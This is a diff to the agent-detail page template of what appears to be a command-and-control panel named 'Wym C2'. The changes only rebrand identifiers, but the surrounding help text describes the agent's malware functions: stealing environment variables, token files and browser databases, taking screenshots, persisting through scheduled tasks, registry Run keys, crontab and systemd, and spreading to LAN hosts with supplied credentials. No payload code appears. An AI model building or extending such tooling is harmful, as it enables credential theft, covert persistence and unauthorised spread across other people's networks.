@@ -1,4 +1,4 @@
-﻿{% extends "base.html" %}
+{% extends "base.html" %}
 {% block title %}{{ agent.hostname }} - Wym C2{% endblock %}
 {% block content %}
 <a href="/dashboard" class="text-sm text-muted hover:text-accent transition inline-flex items-center gap-1 mb-4">
@@ -146,7 +146,7 @@
     screenshot: 'Captures the screen and uploads the PNG to the server (collected files). Optional filename label.',
     steal: 'Profile: all | env | tokens | browser. Collects env vars, credential/token files and raw browser DBs, zips and uploads to collected files. No decryption on the agent side.',
     clone: 'Action: start (monitor target + relaunch when dead) | stop | status. Target agent is selected in "target agent", relaunch command goes in "relaunch command", timeout = check interval (s). Powers cross-agent resurrection (self or a companion).',
-    persistence: 'Copies this agent to a persistent path and registers it to relaunch on logon/reboot with the same server/token/interval. Windows: scheduled task (c2agent-persist) + HKCU Run fallback. Linux/macOS: @reboot crontab + systemd --user unit.',
+    persistence: 'Copies this agent to a persistent path and registers it to relaunch on logon/reboot with the same server/token/interval. Windows: scheduled task (wymagent-persist) + HKCU Run fallback. Linux/macOS: @reboot crontab + systemd --user unit.',
     lateral: 'Discovers LAN peers (arp/ip neigh) and tries to copy+launch this same agent on them. Payload = optional subnet CIDR (or user:pass@CIDR), destination = user, command = password. Without credentials discovery still runs but deploy is skipped.',
     sleep:    'Heartbeat interval in seconds (min 1).',
     exit:     'Agent terminates immediately.',
@@ -199,7 +199,7 @@
     if (t === 'clipboard') destField.placeholder = 'text to set (only for set action)';
     else if (t === 'lateral') destField.placeholder = 'user (optional)';
     else destField.placeholder = 'destination path (optional)';
-    if (t === 'lateral') commandField.placeholder = 'password (optional; agents also read C2_LAT_USER/C2_LAT_PASS)';
+    if (t === 'lateral') commandField.placeholder = 'password (optional; agents also read WYM_LAT_USER/WYM_LAT_PASS)';
     else commandField.placeholder = 'relaunch command when target dies (e.g. python agent.py --server ... --token ...)';
   }
   typeSelect.addEventListener('change', syncFields);
